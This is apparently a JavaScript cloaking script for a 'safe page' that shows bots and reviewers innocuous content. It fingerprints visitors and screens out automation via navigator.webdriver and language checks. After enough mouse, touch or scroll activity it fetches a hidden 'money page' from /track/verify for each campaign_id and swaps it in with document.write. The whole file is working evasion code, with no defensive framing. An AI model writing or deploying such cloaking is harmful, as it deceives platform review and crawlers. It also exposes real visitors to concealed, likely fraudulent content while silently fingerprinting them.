/**
 * Self-boot safe page behavioral hydrator for tracker stub HTML.
 */
(function () {
  var scoreThreshold = 15;
  var score = 0;
  var events = [];

  function campaignIdFromQuery() {
    var q = window.location.search;
    if (!q || q.length < 2) {
      return "";
    }
    var params = new URLSearchParams(q.slice(1));
    return params.get("campaign_id") || "";
  }

  function trackActivity(e) {
    score += 1;
    events.push({ t: e.type, ts: Date.now() });
    if (score >= scoreThreshold) {
      cleanup();
      unlockMoneyPage();
    }
  }

  function cleanup() {
    window.removeEventListener("mousemove", trackActivity);
    window.removeEventListener("touchstart", trackActivity);
    window.removeEventListener("scroll", trackActivity);
  }

  function isBot() {
  return navigator.webdriver ||
    !navigator.languages ||
    navigator.languages.length === 0;
  }

  function fingerprint() {
    return {
      ua: navigator.userAgent,
      lang: navigator.language,
      languages: navigator.languages ? Array.prototype.slice.call(navigator.languages) : [],
      platform: navigator.platform,
      cores: navigator.hardwareConcurrency || 0,
      screen: [window.screen.width, window.screen.height, window.screen.colorDepth],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      webdriver: !!navigator.webdriver,
    };
  }

  function unlockMoneyPage() {
    if (isBot()) {
      return;
    }
    var campaignId = campaignIdFromQuery();
    if (!campaignId) {
      return;
    }
    fetch("/track/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        campaign_id: campaignId,
        events: events,
        fingerprint: fingerprint(),
      }),
    })
      .then(function (res) {
        if (!res.ok) {
          return null;
        }
        return res.json();
      })
      .then(function (data) {
        if (!data || !data.success || !data.html_content) {
          return;
        }
        document.open();
        document.write(data.html_content);
        document.close();
      });
  }

  window.addEventListener("mousemove", trackActivity);
  window.addEventListener("touchstart", trackActivity);
  window.addEventListener("scroll", trackActivity);
})();
